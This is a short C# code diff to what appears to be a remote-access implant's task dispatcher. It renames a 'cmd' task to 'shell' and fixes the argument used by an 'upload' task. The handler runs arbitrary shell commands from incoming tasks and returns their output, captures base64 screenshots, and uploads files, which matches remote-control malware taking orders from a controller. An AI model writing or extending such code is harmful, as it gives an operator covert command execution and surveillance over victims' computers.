@@ -217,14 +217,14 @@ namespace raju
                 case "msg":
                     MessageBox.Show(inputTask.Value<JArray>("args").First.Value<String>());
                     break;
-                case "cmd":
+                case "shell":
                     data.Add("body", RunCommandInShell(inputTask.Value<JArray>("args").First.Value<String>()));
                     break;
                 case "screenshot":
                     data.Add("body", Base64Screenshot());
                     break;
                 case "upload":
-                    UploadAsync(inputTask.Value<JArray>("path").First.Value<String>());
+                    UploadAsync(inputTask.Value<JArray>("args").First.Value<String>());
                     break;
                 default:
                     Console.WriteLine("Invalid Task");
